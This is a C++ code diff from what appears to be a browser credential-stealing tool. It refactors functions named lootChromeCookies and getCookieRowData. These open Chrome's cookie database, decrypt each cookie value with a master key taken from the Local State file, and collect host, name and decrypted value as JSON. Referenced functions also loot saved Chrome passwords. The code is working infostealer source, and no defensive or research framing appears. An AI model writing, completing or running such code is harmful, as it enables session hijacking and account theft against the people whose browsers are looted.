@@ -161,7 +161,7 @@ json lootChromePasswords(const unsigned char* masterKey, string userName) {
 }
 
 
-void lootChromeCookies(const unsigned char* masterKey, string userName, char* writePath) {
+json lootChromeCookies(const unsigned char* masterKey, string userName) {
 	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
 	initializeSodiumLibrary();
 	json lootResult = json::array();
@@ -182,7 +182,8 @@ void lootChromeCookies(const unsigned char* masterKey, string userName, char* wr
 
 	if (errorCode) {
 		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg_(db));
-		return;
+		json j = "error";
+		return j;
 	} else {
 		fprintf(stderr, "Opened database successfully\n");
 	}
@@ -191,105 +192,25 @@ void lootChromeCookies(const unsigned char* masterKey, string userName, char* wr
 	const char* statementStr = "SELECT host_key, name, encrypted_value, path, expires_utc, source_port FROM cookies ORDER BY host_key";
 	if (sqlite3_prepare_v2_(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
     cout << "Prepare failure: %s\n" << sqlite3_errmsg_(db) << endl;
-		return;
+		json j = "error";
+		return j;
 	}
 
-	// HANDLE hFile = CreateFile(
-	// 	writePath,
-	// 	GENERIC_WRITE,
-	// 	FILE_SHARE_READ,
-	// 	NULL,
-	// 	CREATE_ALWAYS,
-	// 	FILE_ATTRIBUTE_NORMAL,
-  //   NULL
-	// );
-	//
-	// if (hFile == INVALID_HANDLE_VALUE) {
-	// 	cout << "Failed to CreateFile\n";
-	// 	return;
-	// }
-	//
 	int stepResult;
-	// string rowData = "";
-	// int dataBufferSize = 2000;
-	// char* dataBuffer = new char[dataBufferSize];
-	// DWORD bytesInBuffer = 0;
-	// DWORD bytesWritten = 0;
-	// int rowDataLength = 0;
-	// BOOL writeFileSuccess;
 
 	while ((stepResult = sqlite3_step_(statement)) == SQLITE_ROW) {
 		json rowData = getCookieRowData(statement, masterKey);
 		lootResult.push_back(rowData);
-
-		// rowData.assign(getCookieRowData(statement, masterKey));
-		// rowDataLength = rowData.length();
-		//
-		// cout << "rowData: " << rowData << endl
-		// 	<< "length: " << rowDataLength << endl;
-		//
-		// // Check for potential buffer overflow
-		// // Output dataBuffer to file before overflow happens
-		// if (bytesInBuffer + rowDataLength > dataBufferSize) {
-		// 	// write to file here
-		// 	writeFileSuccess = WriteFile(
-		// 		hFile,
-		// 		dataBuffer,
-		// 		bytesInBuffer,
-		// 		&bytesWritten,
-		// 		NULL
-		// 	);
-		//
-		// 	if (!writeFileSuccess) {
-		// 		cout << "Failed to write to file.\n"
-		// 			<< "Bytes in buffer: " << bytesInBuffer << endl
-		// 			<< "dataBufferSize: " << dataBufferSize << endl
-		// 			<< "bytesWritten to file: " << bytesWritten << endl;
-		//
-		// 		CloseHandle(hFile);
-		// 		return;
-		// 	}
-		//
-		// 	memset(dataBuffer, 0, dataBufferSize);
-		// 	bytesInBuffer = 0;
-		// 	bytesWritten = 0;
-		// }
-		//
-		// // Add to dataBuffer
-		// strncpy(&dataBuffer[bytesInBuffer], rowData.c_str(), rowDataLength);
-		// bytesInBuffer += rowDataLength;
 	}
 
 	if (stepResult != SQLITE_DONE) {
     cout << "Step failure: %s\n" << sqlite3_errmsg_(db) << endl;
 	}
-	// } else {
-	// 	// Print remaining cookies
-	// 	writeFileSuccess = WriteFile(
-	// 		hFile,
-	// 		dataBuffer,
-	// 		bytesInBuffer,
-	// 		&bytesWritten,
-	// 		NULL
-	// 	);
-	//
-	// 	if (!writeFileSuccess) {
-	// 		cout << "Failed to write to file.\n"
-	// 			<< "Bytes in buffer: " << bytesInBuffer << endl
-	// 			<< "dataBufferSize: " << dataBufferSize << endl
-	// 			<< "bytesWritten to file: " << bytesWritten << endl;
-	//
-	// 		CloseHandle(hFile);
-	// 		return;
-	// 	}
-	// }
 
-	// delete [] dataBuffer;
 	sqlite3_finalize_(statement);
   sqlite3_close_(db);
-	cout << "lootResult: " << lootResult << endl;
+	return lootResult;
 }
-
 
 // Get the encrypted key stored at Local State file
 // Need to decrypt it with Base64 and then DPAPI to get the master key for decrypting user passwords
@@ -419,51 +340,33 @@ json getPasswordRowData(sqlite3_stmt* statement, const unsigned char* masterKey)
 
 json getCookieRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {
 
-	try {
-		unsigned char* host_key = (unsigned char*) sqlite3_column_text_(statement, 0);
-		unsigned char* name = (unsigned char*) sqlite3_column_text_(statement, 1);
-		unsigned char* encrypted_value = (unsigned char*) sqlite3_column_text_(statement, 2);
-		unsigned char* path = (unsigned char*) sqlite3_column_text_(statement, 3);
-		unsigned char* expires_utc = (unsigned char*) sqlite3_column_text_(statement, 4);
-		unsigned char* source_port = (unsigned char*) sqlite3_column_text_(statement, 5);
-		int encrypted_value_len = sqlite3_column_bytes_(statement, 2);
+	unsigned char* host_key = (unsigned char*) sqlite3_column_text_(statement, 0);
+	unsigned char* name = (unsigned char*) sqlite3_column_text_(statement, 1);
+	unsigned char* encrypted_value = (unsigned char*) sqlite3_column_text_(statement, 2);
+	unsigned char* path = (unsigned char*) sqlite3_column_text_(statement, 3);
+	unsigned char* expires_utc = (unsigned char*) sqlite3_column_text_(statement, 4);
+	unsigned char* source_port = (unsigned char*) sqlite3_column_text_(statement, 5);
+	int encrypted_value_len = sqlite3_column_bytes_(statement, 2);
 
-		unsigned char decryptedValue[1000];
-		decryptWithAesGcm256(masterKey, encrypted_value, encrypted_value_len, decryptedValue);
+	unsigned char decryptedValue[1000];
+	decryptWithAesGcm256(masterKey, encrypted_value, encrypted_value_len, decryptedValue);
 
-		// Convert to strings so that they could be added to a json structure
-		string host_key_s(reinterpret_cast<char*>(host_key));
-		string name_s(reinterpret_cast<char*>(name));
-		string decrypted_value_s(reinterpret_cast<char*>(decryptedValue));
-		string path_s(reinterpret_cast<char*>(path));
-		string expires_utc_s(reinterpret_cast<char*>(expires_utc));
-		string source_port_s(reinterpret_cast<char*>(source_port));
+	// Convert to strings so that they could be added to a json structure
+	string host_key_s(reinterpret_cast<char*>(host_key));
+	string name_s(reinterpret_cast<char*>(name));
+	string decrypted_value_s(reinterpret_cast<char*>(decryptedValue));
+	string path_s(reinterpret_cast<char*>(path));
+	string expires_utc_s(reinterpret_cast<char*>(expires_utc));
+	string source_port_s(reinterpret_cast<char*>(source_port));
 
-		json rowData = {
-			{"host_key", host_key_s},
-			{"name", name_s},
-			{"decrypted_value", decrypted_value_s},
-			{"path", path_s},
-			{"expires_utc", expires_utc_s},
-			{"source_port", source_port_s}
-		};
+	json rowData = {
+		{"host_key", host_key_s},
+		{"name", name_s},
+		{"decrypted_value", decrypted_value_s},
+		{"path", path_s},
+		{"expires_utc", expires_utc_s},
+		{"source_port", source_port_s}
+	};
 
-		return rowData;
-
-		// ostringstream stream;
-	  // stream << host_key_s << ",*,* "
-		// 	<< name_s << ",*,* "
-		// 	<< decrypted_value_s << ",*,* "
-		// 	<< path_s << ",*,* "
-		// 	<< expires_utc_s << ",*,* "
-		// 	<< source_port_s << endl;
-		//
-		// string rowData = stream.str();
-		// return rowData;
-	}
-	catch (const std::exception e) {
-		cout << "getCookieRowData error: " << e.what() << endl;
-		json j = {};
-		return j;
-	}
+	return rowData;
 }
